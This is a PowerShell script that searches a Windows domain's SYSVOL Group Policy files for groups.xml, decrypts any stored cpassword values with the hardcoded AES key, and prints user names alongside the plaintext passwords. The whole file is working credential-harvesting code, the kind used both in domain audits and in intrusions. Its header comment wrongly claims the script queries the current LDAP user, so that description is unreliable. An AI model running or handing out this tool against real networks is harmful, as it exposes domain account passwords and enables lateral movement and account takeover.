<#
.SYNOPSIS

Gets the current user who is authenticating to LDAP

Author: Thomas Rodrigues (@L4nzN0t_)
Required Dependencies: None

.DESCRIPTION

Gets the current user who is authenticating to LDAP. It does so by using the
LDAP_SERVER_WHO_AM_I_OID extended operation (MS-ADTS 3.1.1.3.4.2.4
LDAP_SERVER_WHO_AM_I_OID - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/faf0b8c6-8c59-439f-ac62-dc4c078ed715).



#>


Clear-Host
$files = Get-ChildItem -Path C:\Windows\SYSVOL*\domain\Policies -Include groups.xml -Recurse
$global:allobj = @()
$count = 0

function Decrypt
{
    param([string]$CPass)
    $cipher_base64 = $CPass
    $hexKey = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
    $keyBytes = [byte[]]@()
    for ($i = 0; $i -lt $hexKey.Length; $i += 2)
    {
        $keyBytes += [Convert]::ToByte($hexKey.Substring($i,2),16)

    }

    $miss_padding = ($cipher_base64.Length % 4)
    if ($miss_padding -ne 0)
    { $cipher_base64 += '=' * (4 - $miss_padding)}


    $cipher_bytes = [Convert]::FromBase64String($cipher_base64)

    $iv = $cipher_bytes[0..15]
    $cipher_text = $cipher_bytes[16..($cipher_bytes.Length - 1)]

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.IV = $iv
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cryptoStream.Write($cipher_text, 0, $cipher_text.Length)
    $cryptoStream.FlushFinalBlock()

    $plainBytes = $memoryStream.ToArray()

    $cryptoStream.Close()
    $memoryStream.Close()

    $plainBytes = $plainBytes | Where-Object { $_ -ne 0 }

    $plainText = [System.Text.Encoding]::UTF8.GetString($plainBytes)
    #$memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    #$streamReader = New-Object System.IO.StreamReader($memoryStream)
    #$plainText = $streamReader.ReadToEnd()

    #$streamReader.Close()
    return $plaintext

}

foreach ($file in $files)
{
    $xml = [xml] (Get-Content $file.FullName)
    if ($file.FullName -match '{[0-9A-Fa-f\-]+}') {
        $guid = $matches[0]
    }
    $gpo = Get-GPO -Guid $guid -ErrorAction SilentlyContinue
    Write-Host "INFO! GPO Found: '$($gpo.DisplayName)'" -ForegroundColor Yellow -BackgroundColor Black


    if ($xml.Groups.User.Properties.cpassword)
    {
        $password = Decrypt $xml.Groups.User.Properties.cpassword
        $obj = [PSCustomObject]@{
            GPOName = $gpo.DisplayName
            FileName = $file.FullName
            User = $xml.Groups.User.name
            CPassword = $xml.Groups.User.Properties.cpassword
            DecryptedPassword =  $password
        }
        $global:allobj += $obj
    } else {
        $count += 1
    }
}

if ($count -eq $files.Count)
{
    Write-Host ""
    Write-Host "INFO! NO GPO had cpassword attribute enabled" -ForegroundColor Green -BackgroundColor Black
} else
{
    $global:allobj | Format-Table GPOName, User, CPassword, DecryptedPassword
}

